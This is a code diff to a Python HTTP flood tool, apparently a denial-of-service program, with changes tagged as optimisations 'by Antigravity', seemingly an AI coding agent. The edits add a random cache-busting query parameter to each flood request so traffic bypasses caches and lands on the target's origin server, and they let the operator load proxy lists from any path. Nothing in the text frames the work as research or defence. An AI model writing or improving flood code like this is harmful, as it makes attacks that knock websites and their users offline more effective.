@@ -911,7 +911,8 @@ class HttpFlood(Thread):
         # [OPTIMIZED] Cache Busting by Antigravity
         sep = "&" if "?" in target.raw_path_qs else "?"
         rnd = str(randchoice(range(1111, 9999)))
-        self._defaultpayload = "%s %s" + sep + "v=" + rnd + " HTTP/%s\r\n" % (self._req_type, target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+        ver = randchoice(['1.0', '1.1', '1.2'])
+        self._defaultpayload = f"{self._req_type} {target.raw_path_qs}{sep}v={rnd} HTTP/{ver}\r\n"
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Cache-Control: max-age=0\r\n'
@@ -1747,8 +1748,11 @@ if __name__ == '__main__':
                 rpc = int(argv[6])
                 timer = int(argv[7])
                 proxy_ty = int(argv[3].strip())
-                proxy_li = Path(__dir__ / "files/proxies/" /
-                                argv[5].strip())
+                # [OPTIMIZED] Flexible Path L7
+                user_path = argv[5].strip()
+                proxy_li = Path(user_path)
+                if not proxy_li.exists():
+                    proxy_li = Path(__dir__ / "files/proxies/" / user_path)
                 useragent_li = Path(__dir__ / "files/useragent.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
                 bombardier_path = Path.home() / "go/bin/bombardier"
